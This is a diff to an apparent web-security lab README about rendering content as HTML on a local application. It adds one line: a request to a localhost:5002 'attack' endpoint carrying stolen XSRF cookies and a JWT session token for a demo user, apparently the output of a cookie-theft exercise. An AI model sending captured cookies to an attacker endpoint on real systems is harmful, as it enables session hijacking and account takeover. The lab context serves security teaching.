@@ -83,3 +83,7 @@ the content on the real application will show as HTML or as plain text.
 
 [http://localhost:5001]: http://localhost:5001
 [logging into the real application]: http://localhost:5001/login
+
+
+
+http://localhost:5002/attack?cookies=XSRF-TOKEN%3DEocDFxJp-naW8GKC0Uv-jXfNwcNaWoTznxHw%3B%20XSRF-Token%3DRbiGPJ7O-aHC3CZjnuK49gUtJZ0VGdGdy0EY%3B%20token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IkRlbW9Vc2VyIn0sImlhdCI6MTY3NjQ3OTQ1Mn0.lQ2Ov3l20J-WE35zV3efGybWRhRDwLpHGjPYY7oJjbI
